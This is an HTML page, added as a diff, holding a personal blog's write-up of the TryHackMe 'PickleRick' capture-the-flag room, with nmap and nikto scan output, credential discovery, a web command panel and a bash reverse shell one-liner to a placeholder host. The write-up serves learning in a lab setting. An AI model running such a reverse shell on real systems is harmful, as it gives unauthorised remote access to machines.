@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Leo Smith's website, specialized in cyber security research, programming and audit. This website also contains my personal cyber security write ups and tools.">
+  <meta name="author" content="Leo Smith">
+
+  <title>Leo Smith - PickleRick</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Custom fonts for this theme -->
+  <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+
+  <!-- Theme CSS -->
+  <link href="../css/freelancer.css" rel="stylesheet">
+  <link href="../css/blog-post.css" rel="stylesheet">
+  <link rel="shortcut icon" type="image/png" href="../img/favicon.png"/>
+  <!-- Custom styles for this template -->
+
+</head>
+
+<body id="page-top">
+
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand js-scroll-trigger" href="#page-top">Leo Smith</a>
+      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item mx-0 mx-lg-1">
+            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="../index.html">Home</a>
+          </li>
+          <li class="nav-item mx-0 mx-lg-1">
+            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="../writeups/">Write-Ups</a>
+          </li>
+          <li class="nav-item mx-0 mx-lg-1">
+            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="../projects/">Projects</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Content -->
+  <div class="container post">
+
+    <div class="row">
+
+      <!-- Post Content Column -->
+      <div class="col-lg-8">
+
+        <!-- Title -->
+        <h1 class="mt-4">PickleRick</h1>
+
+        <!-- Author -->
+        <p class="lead">
+          by Leo Smith /
+          <a href="https://github.com/p4p1">p4p1</a>
+        </p>
+
+        <hr>
+
+        <!-- Date/Time -->
+        <p>Created on Sat. 02 May 2020</p>
+
+        <hr>
+
+        <!-- Preview Image -->
+        <img class="img-fluid rounded" src="https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg" alt="">
+
+        <hr>
+
+        <!-- Post Content -->
+        <p class="lead">
+          Today I completed an other room on
+          <a href="https://tryhackme.com/room/picklerick">tryhackme</a>
+          with a Rick and Morty theme to it!
+        </p>
+
+        <p>
+          I am still a noob and I did do a few errors while trying to break into
+          this machine.
+        </p>
+
+        <h3 id="recon">Reconnaissance</h3>
+
+        <p>
+          As usual I scanned the IP provided by tryhackme to see what services are
+          running on the machine.
+        </p>
+
+        <pre>
+          <code class="prettyprint">
+            Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-02 14:24 CEST
+            Pre-scan script results:
+            | broadcast-avahi-dos:
+            |   Discovered hosts:
+            |     224.0.0.251
+            |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+            |_  Hosts are all up (not vulnerable).
+            Nmap scan report for 10.10.166.40
+            Host is up (0.020s latency).
+            Not shown: 998 closed ports
+            PORT   STATE SERVICE VERSION
+            22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+            80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+            | http-cookie-flags:
+            |   /login.php:
+            |     PHPSESSID:
+            |_      httponly flag not set
+            |_http-csrf: Couldn't find any CSRF vulnerabilities.
+            |_http-dombased-xss: Couldn't find any DOM based XSS.
+            | http-enum:
+            |   /login.php: Possible admin folder
+            |_  /robots.txt: Robots file
+            | http-fileupload-exploiter:
+            |
+            |     Couldn't find a file-type field.
+            |
+            |_    Couldn't find a file-type field.
+            |_http-server-header: Apache/2.4.18 (Ubuntu)
+            | http-sql-injection:
+            |   Possible sqli for queries:
+            |     http://10.10.166.40/assets/r.location.href,t.head.appendChild(i)):t=r),o=A.exec(e),a=!n&&%5b%5d,o?w%28a%29
+            .remove%28%29%2cw.merge%28%5b%5d%2co.childNodes%29%29%7d%2cw.fn.load=function%28e%2ct%2cn%29%7bvar%27%20OR%20sql
+            spider&%5bt.createElement%28o%5b1%5d%29%5d%3a%28o=xe%28%5be%5d%2ct%2ca%29%2ca&=&a.length=
+            |     http://10.10.166.40/assets/r.location.href,t.head.appendChild(i)):t=r),o=A.exec(e),a=!n&&%5b%5d,o?w%28a%29
+            .remove%28%29%2cw.merge%28%5b%5d%2co.childNodes%29%29%7d%2cw.fn.load=function%28e%2ct%2cn%29%7bvar&%5bt.createEl
+            ement%28o%5b1%5d%29%5d%3a%28o=xe%28%5be%5d%2ct%2ca%29%2ca%27%20OR%20sqlspider&=&a.length=
+            |     http://10.10.166.40/assets/r.location.href,t.head.appendChild(i)):t=r),o=A.exec(e),a=!n&&%5b%5d,o?w%28a%29
+            .remove%28%29%2cw.merge%28%5b%5d%2co.childNodes%29%29%7d%2cw.fn.load=function%28e%2ct%2cn%29%7bvar&%5bt.createEl
+            ement%28o%5b1%5d%29%5d%3a%28o=xe%28%5be%5d%2ct%2ca%29%2ca&=%27%20OR%20sqlspider&a.length=
+            |     http://10.10.166.40/assets/r.location.href,t.head.appendChild(i)):t=r),o=A.exec(e),a=!n&&%5b%5d,o?w%28a%29
+            .remove%28%29%2cw.merge%28%5b%5d%2co.childNodes%29%29%7d%2cw.fn.load=function%28e%2ct%2cn%29%7bvar&%5bt.createEl
+            ement%28o%5b1%5d%29%5d%3a%28o=xe%28%5be%5d%2ct%2ca%29%2ca&=&a.length=%27%20OR%20sqlspider
+            |     http://10.10.166.40/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
+            |     http://10.10.166.40/assets/?C=N%3bO%3dD%27%20OR%20sqlspider
+            |     http://10.10.166.40/assets/?C=N%3bO%3dA%27%20OR%20sqlspider
+            |_http-stored-xss: Couldnt find any stored XSS vulnerabilities.
+            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+            Nmap done: 1 IP address (1 host up) scanned in 359.68 seconds
+
+            #[p4p1@computer thm/]$ nikto -host 10.10.110.84
+            - Nikto v2.1.5
+            ---------------------------------------------------------------------------
+            + Target IP:          10.10.110.84
+            + Target Hostname:    10.10.110.84
+            + Target Port:        80
+            + Start Time:         2020-05-02 18:33:22 (GMT2)
+            ---------------------------------------------------------------------------
+            + Server: Apache/2.4.18 (Ubuntu)
+            + Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686
+            + The anti-clickjacking X-Frame-Options header is not present.
+            + No CGI Directories found (use '-C all' to force check all possible dirs)
+            + "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+            + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+            + Cookie PHPSESSID created without the httponly flag
+            + OSVDB-3233: /icons/README: Apache default file found.
+            + /login.php: Admin login page/section found.
+            + 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+            + End Time:           2020-05-02 18:44:53 (GMT2) (376 seconds)
+            --------------------------------------------------------------------------
+          </code>
+        </pre>
+
+        <p>
+          While the nikto and nmap scans where running I also decided to run a few
+          scans with OWASP zap proxy just in case.
+        </p>
+        <img class="img-fluid rounded" src="img/picklerick/zap.png" alt="">
+        <p></p>
+        <p>
+          With all of the scans finished and all of this information I went on the
+          main page to explore a little. I then opened the source code and found a
+          username.
+        </p>
+        <img class="img-fluid rounded" src="img/picklerick/notetoself.png" alt="">
+        <p></p>
+        <p>
+          With that out of my way their is obviously a login page somewhere. Looking
+          back at the scans it was pretty obvious the login page was in /login.php.
+          But the scans also returned some information about robots.txt so I decided
+          I should visit that too. Opening the robots.txt file I see a string that
+          resembles a password so I decided to go on the login page and try it.
+        </p>
+
+        <h3 id="command_inject">Command Injection</h3>
+
+        <p>
+          From here after logging in with ricks account there was a command panel.
+          Seeing this I wanted to inject some kind of reverse shell so that I could
+          mess around a lot more! So I began by seeing who I was and what was inside
+          of the directory.
+        </p>
+        <img class="img-fluid rounded" src="img/picklerick/command.png" alt="">
+        <p></p>
+        <p>
+          I was in /var/www/html and my user was: www-data. With sudo -l I saw that
+          I had basically root access from the get go, so no need for any Privilege
+          Escalation today. In the current working directory of the user www-data
+          the first flag is located in a .txt file. With also a clue.txt I opened the
+          file in my browser and it gave me the position of the second flag is in
+          the /home/ folder. When running the cat command inside of the shell there
+          was an error and I could not run the cat command. So I figured I needed
+          a proper shell either a reverse one or with a phpbash script. So I uploaded
+          php bash but the script wasn't working for some reason.
+        </p>
+        <img class="img-fluid rounded" src="img/picklerick/uploadphpbash.png" alt="">
+        <p></p>
+        <p>
+          After a lot of trial and error with python reverse shells not understanding
+          why that didn't work I looked up at an other write up and found that
+          you could do a bash reverse shell and after running it encapsulated in
+          a bash -c ''. I had a reverse shell:
+        </p>
+        <pre>
+          <code class="prettyprint">
+            bash -c 'bash -i >& /dev/tcp/x.x.x.x/8080 0>&1'
+          </code>
+        </pre>
+
+        <p>
+          With the reverse shell working I then displayed the flag in the home folder
+          and with the prior knowledge that the user could run sudo commands without
+          password I displayed the flag located in the root directory
+        </p>
+        <img class="img-fluid rounded" src="img/picklerick/root.png" alt="">
+        <p></p>
+       <hr />
+
+       <p>
+         In conclusion this room was easy but I felt very rusty I took a 3 day break
+         and it really didn't help I need to get back in the flow of solving those
+         rooms.
+       </p>
+       <p>
+         Thank you for reading please check out my other write ups and share this
+         page.
+       </p>
+
+      </div>
+
+
+      <!-- Sidebar Widgets Column -->
+      <div class="col-md-4">
+        <!-- Categories Widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Categories</h5>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-lg-6">
+                <ul class="list-unstyled mb-0">
+                  <li>
+                    <a href="#recon">Reconnaissance</a>
+                  </li>
+                  <li>
+                    <a href="#command_inject">Command Injection</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Dark mode Widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Dark Mode</h5>
+          <div class="card-body">
+            <label class="switch">
+              <input type="checkbox" id="toggleshade" onclick="shade();shade2();">
+              <span class="slider round"></span>
+            </label>
+          </div>
+        </div>
+        <div class="card my-4">
+          <h5 class="card-header">My tryhackme account</h5>
+          <div class="card-body">
+            <script src="https://tryhackme.com/badge/17154"></script>
+          </div>
+        </div>
+        <!-- Share widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Share</h5>
+          <div class="card-body">
+            <!-- AddToAny BEGIN -->
+            <div class="a2a_kit a2a_kit_size_32 a2a_default_style center">
+              <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+              <a class="a2a_button_google_gmail"></a>
+              <a class="a2a_button_facebook"></a>
+              <a class="a2a_button_twitter"></a>
+              <a class="a2a_button_reddit"></a>
+            </div>
+            <script async src="https://static.addtoany.com/menu/page.js"></script>
+            <!-- AddToAny END -->
+          </div>
+        </div>
+        <!-- Categories Widget -->
+        <div class="card my-4">
+          <h5 class="card-header">Links</h5>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-lg-6">
+                <ul class="list-unstyled mb-0">
+                  <li>
+                    <a href="https://tryhackme.com/room/picklerick">The Challenge</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+    <!-- /.row -->
+
+  </div>
+  <!-- /.container -->
+
+  <!-- Footer -->
+  <footer class="footer text-center">
+    <div class="container">
+      <div class="row">
+
+        <div class="col-lg-4 mb-5 mb-lg-0">
+          <h4 class="text-uppercase mb-4">Share</h4>
+          <!-- AddToAny BEGIN -->
+          <div class="a2a_kit a2a_kit_size_32 a2a_default_style center">
+            <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+            <a class="a2a_button_google_gmail"></a>
+            <a class="a2a_button_facebook"></a>
+            <a class="a2a_button_twitter"></a>
+            <a class="a2a_button_reddit"></a>
+          </div>
+          <script async src="https://static.addtoany.com/menu/page.js"></script>
+          <!-- AddToAny END -->
+        </div>
+
+        <div class="col-lg-4 mb-5 mb-lg-0">
+          <h4 class="text-uppercase mb-4">About this page</h4>
+          <p class="lead mb-0">Template found <a target="_blank" rel="noopener noreferrer" href="https://startbootstrap.com/themes/freelancer/">here</a>.</p>
+        </div>
+
+        <div class="col-lg-4 mb-5 mb-lg-0">
+          <h4 class="text-uppercase mb-4">Follow me</h4>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://www.linkedin.com/in/leo-smith-1bab2a156/">
+            <i class="fab fa-fw fa-linkedin-in"></i>
+          </a>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://github.com/p4p1">
+            <i class="fab fa-github"></i>
+          </a>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://linuxsecurity.expert/p/leo-smith">
+              <i class="fab fa-linux"></i>
+          </a>
+          <a class="btn btn-outline-light btn-social mx-1" href="https://tryhackme.com/p/p4p1">
+              <i class="fas fa-flag-checkered"></i>
+          </a>
+        </div>
+
+      </div>
+    </div>
+  </footer>
+  <!-- Copyright Section-->
+  <section class="copyright py-4 text-center text-white">
+    <div class="container"><small>Copyright © Leo Smith 2020</small></div>
+  </section>
+  <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes) -->
+  <div class="scroll-to-top d-lg-none position-fixed ">
+    <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="../vendor/jquery/jquery.min.js"></script>
+  <script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Plugin JavaScript -->
+  <script src="../vendor/jquery-easing/jquery.easing.min.js"></script>
+
+  <!-- Contact Form JavaScript -->
+  <script src="../js/jqBootstrapValidation.js"></script>
+  <script src="../js/contact_me.js"></script>
+
+  <!-- Custom scripts for this template -->
+  <script src="../js/freelancer.min.js"></script>
+  <script src="../js/hidden.js"></script>
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163484307-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-163484307-1');
+  </script>
+
+  <script>
+    var card = document.getElementsByClassName("card");
+    var h4Elements = document.getElementsByTagName("h4");
+    var dark2=getDarkcookie();
+    document.addEventListener('keypress', logKey2);
+    if (dark2 == 1) {
+      for (var i = 0; i < card.length; i++) {
+        card[i].style.backgroundColor = "#423d3d";
+      }
+    }
+    function logKey2(e) {
+      if (e.key === 'b') {
+        if (dark2 == 0) {
+          document.getElementById("toggleshade").checked = true;
+          document.cookie = "dark=1";
+          for (var i = 0; i < card.length; i++) {
+            card[i].style.backgroundColor = "#423d3d";
+          }
+          for(var i = 0; i < h4Elements.length; i++) {
+               h4Elements[i].style.color = "#fff";
+          }
+          dark2 = 1;
+        } else {
+          document.getElementById("toggleshade").checked = false;
+          document.cookie = "dark=0";
+          document.body.style.color = "#000"
+          for (var i = 0; i < card.length; i++) {
+            card[i].style.backgroundColor = "#FFF";
+          }
+          for(var i = 0; i < h4Elements.length; i++) {
+               h4Elements[i].style.color = "#fff";
+          }
+          dark2 = 0;
+        }
+      }
+    }
+    function shade2() {
+      if (dark2 == 0) {
+        document.getElementById("toggleshade").checked = true;
+        document.cookie = "dark=1";
+        for (var i = 0; i < card.length; i++) {
+          card[i].style.backgroundColor = "#423d3d";
+        }
+        for(var i = 0; i < h4Elements.length; i++) {
+             h4Elements[i].style.color = "#fff";
+        }
+        dark2 = 1;
+      } else {
+        document.getElementById("toggleshade").checked = false;
+        document.cookie = "dark=0";
+        document.body.style.color = "#000"
+        for (var i = 0; i < card.length; i++) {
+          card[i].style.backgroundColor = "#FFF";
+        }
+        for(var i = 0; i < h4Elements.length; i++) {
+             h4Elements[i].style.color = "#fff";
+        }
+        dark2 = 0;
+      }
+    }
+  </script>
+  <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>
+
+</body>
+
+</html>
